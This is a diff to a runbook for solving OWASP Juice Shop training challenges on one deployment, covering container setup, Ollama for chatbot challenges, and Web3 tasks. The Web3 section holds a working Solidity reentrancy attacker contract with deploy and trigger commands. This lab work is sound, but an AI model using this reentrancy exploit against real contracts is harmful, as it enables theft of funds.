@@ -47,10 +47,11 @@ Pre-flight: verify `RECON_ENABLED` flag file is present before running solver af
    ```bash
    IMAGE=$(docker inspect juice-shop --format '{{.Config.Image}}')
    PORT=$(docker inspect juice-shop --format '{{(index (index .HostConfig.PortBindings "3000/tcp") 0).HostPort}}')
+   VOLS=$(docker inspect juice-shop | jq -r '.[0].Mounts[]|select(.Type=="volume")|"-v \(.Name):\(.Destination)"' | tr '\n' ' ')
    docker rm juice-shop
-   docker run -d --name juice-shop -p ${PORT}:3000 -e NODE_ENV=test ${IMAGE}
+   docker run -d --name juice-shop -p ${PORT}:3000 -e NODE_ENV=test $VOLS ${IMAGE}
    ```
-   Alternative if source is on host: `cd /path/to/juice-shop && NODE_ENV=test node server.js`
+   Custom env vars or network mode from the original container: capture via `docker inspect juice-shop --format '{{json .HostConfig}}'` and pass explicitly.
 6. Verify: `curl http://localhost:3000/api/Challenges | jq '[.data[]|select(.disabledEnv=="Docker")]|length'` → `0`
 
 ### Category B — Chatbot challenges (3 challenges, operator-resolvable)
@@ -68,13 +69,19 @@ then confirm reachability: `docker exec juice-shop curl http://host.docker.inter
 
 **Operator action on target host:**
 ```bash
-# Extract model tag from Juice Shop config before pulling
+# Extract model tag from Juice Shop config
 MODEL=$(docker exec juice-shop grep -A3 'chatBot:' config/default.yml \
-  | grep 'model:' | awk '{print $2}' | tr -d "'\"" 2>/dev/null || echo "gemma4:e4b")
-ollama serve &
+  | grep 'model:' | awk '{print $2}' | tr -d "'\"" 2>/dev/null)
+MODEL=${MODEL:-gemma4:e4b}
+echo "Using model: $MODEL"
+# Start Ollama if not already running, then wait for it to be ready
+pgrep -x ollama >/dev/null || ollama serve &
+for i in $(seq 1 5); do
+  curl -sf http://localhost:11434/api/tags >/dev/null 2>&1 && break; sleep 3
+done
+curl -sf http://localhost:11434/api/tags >/dev/null || { echo "Ollama not ready"; exit 1; }
 ollama pull "$MODEL"
 ollama list                # verify model appears
-curl http://localhost:11434/api/tags  # health: JSON with models array
 ```
 
 **Agent action once Ollama is running:**
@@ -133,15 +140,13 @@ curl -s 'https://target.cocode.dk/api/Challenges?key=aiDebuggingChallenge'      
 running (`/rest/web3/nftMintListen` → `{"success":true}`). Sepolia wallet
 `0x8343d2eb2B13A2495De435a1b15e85b98115Ce05` has 0 ETH.
 
-Operator pre-flight: set env vars and import key before running agent action.
+Operator pre-flight: import key and set RPC before running agent action.
 ```bash
 HISTFILE=/dev/null
-export JUICE_SHOP_WALLET_KEY=<operator-provided-private-key>
+# Import key securely — prompts for private key + encryption password (never in env or argv)
+cast wallet import juice-shop-wallet
 export ALCHEMY_API_KEY=<operator-provided-alchemy-api-key>
 export ALCHEMY_SEPOLIA_RPC="https://eth-sepolia.g.alchemy.com/v2/$ALCHEMY_API_KEY"
-# Import into Foundry keystore to prevent --private-key argv exposure (visible in ps aux)
-cast wallet import juice-shop-wallet --private-key "$JUICE_SHOP_WALLET_KEY"
-unset JUICE_SHOP_WALLET_KEY
 # Chain ID: 11155111. ABIs in Juice Shop source: data/static/web3-snippets/
 ```
 
@@ -169,14 +174,18 @@ curl -s -XPOST https://target.cocode.dk/rest/web3/walletNFTVerify \
   -H 'Content-Type: application/json' \
   -d '{"walletAddress":"0x8343d2eb2B13A2495De435a1b15e85b98115Ce05"}'
 # Expected: {"success":true}; poll for Alchemy WebSocket to mark challenge solved (up to 30s)
+SOLVED=false
 for i in $(seq 1 10); do sleep 3
   SOLVED=$(curl -s 'https://target.cocode.dk/api/Challenges?key=nftMintChallenge' | jq '.data[0].solved')
   [ "$SOLVED" = "true" ] && { echo "nftMintChallenge: solved"; break; } || echo "Waiting... ($i/10)"
 done
+[ "$SOLVED" = "true" ] || { echo "nftMintChallenge not confirmed after 30s — check Alchemy WebSocket"; exit 1; }
 ```
 3. For `web3WalletChallenge` (ETHWalletBank at `0x413744D59d31AFDC2889aeE602636177805Bd7b0`):
-   a. Save `Attacker.sol` (Solidity 0.8, chain 11155111) — `hits` counter prevents gas exhaustion:
+   a. Save as `./Attacker.sol` (Solidity 0.8, chain 11155111) — `hits` counter prevents gas exhaustion:
 ```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 interface IBank { function deposit() external payable; function withdraw(uint256) external; }
 contract Attacker {
     IBank bank; uint256 amt; uint8 hits;
@@ -187,11 +196,13 @@ contract Attacker {
     function attack() external payable { amt = msg.value; bank.deposit{value: amt}(); bank.withdraw(amt); }
 }
 ```
-   b. Deploy to get `$ATTACKER`, then register it — `ContractExploited` emits the contract address:
+   b. Build, deploy, validate `$ATTACKER`, then register it — `ContractExploited` emits the contract address:
 ```bash
+forge build
 ATTACKER=$(forge create ./Attacker.sol:Attacker \
   --constructor-args 0x413744D59d31AFDC2889aeE602636177805Bd7b0 \
   --rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet | grep "Deployed to:" | awk '{print $3}')
+[[ "$ATTACKER" =~ ^0x[0-9a-fA-F]{40}$ ]] || { echo "Deploy failed — bad address: $ATTACKER"; exit 1; }
 curl -s -XPOST https://target.cocode.dk/rest/web3/walletExploitAddress \
   -H 'Content-Type: application/json' \
   -d "{\"walletAddress\": \"$ATTACKER\"}"
@@ -202,10 +213,12 @@ curl -s -XPOST https://target.cocode.dk/rest/web3/walletExploitAddress \
 cast send $ATTACKER "attack()" --value 0.001ether \
   --rpc-url $ALCHEMY_SEPOLIA_RPC --account juice-shop-wallet
 # Poll for Alchemy WebSocket to mark challenge solved (up to 30s)
+SOLVED=false
 for i in $(seq 1 10); do sleep 3
   SOLVED=$(curl -s 'https://target.cocode.dk/api/Challenges?key=web3WalletChallenge' | jq '.data[0].solved')
   [ "$SOLVED" = "true" ] && { echo "web3WalletChallenge: solved"; break; } || echo "Waiting... ($i/10)"
 done
+[ "$SOLVED" = "true" ] || { echo "web3WalletChallenge not confirmed after 30s — check Alchemy WebSocket"; exit 1; }
 ```
       Reentrancy increments `userWithdrawing[$ATTACKER]` to 2 → emits `ContractExploited`
       → Alchemy WebSocket → `web3WalletChallenge` solved.
@@ -262,3 +275,10 @@ After each operator unlock, verify by challenge key:
 - **gemma4:e4b fallback (r7-2)**: The preflight now extracts the model tag at runtime from Juice Shop's config. The fallback `echo "gemma4:e4b"` is the observed value — if the grep fails, the operator verifies manually before proceeding. Removing the fallback would silently break the pull command.
 - **OLLAMA_HOST key (r7-3)**: Same as r5-2. The chat health check added in the prior round gives the testable signal: if `/rest/chat` returns 200, Juice Shop is reaching Ollama regardless of which env var name it uses.
 - **Contract address verification (r7-6)**: Same as r5-5. These addresses are Sepolia-deployed immutables in Juice Shop's own `data/static/web3-snippets/`. If they've changed, Juice Shop itself is broken. No preflight `cast code` check adds useful signal here.
+
+### cursor-agent r8 push-backs
+
+- **BASE_URL variable (r8-4)**: `https://target.cocode.dk` is the actual deployment target, not a configurable parameter. The spec is for this specific deployment. Abstracting it to a variable adds indirection without benefit for a one-deployment runbook.
+- **Chatbot retry prompts (r8-5)**: Same as r5-3. LLM outputs are nondeterministic; the API-level `solved==true` check after each attempt is the correct gate. The operator adapts language if the first attempt fails.
+- **Contract address preflight (r8-7)**: Same as r5-5 / r7-6. On-chain immutables from Juice Shop source.
+- **JWT/RPC assertions (r8-12)**: JWT is obtained in the step immediately before the chatbot requests; an empty JWT causes the request to fail with a clear HTTP 401. RPC is set in the pre-flight; an empty string would cause cast to fail with a clear error. Adding redundant non-empty assertions does not improve debuggability over the native errors.
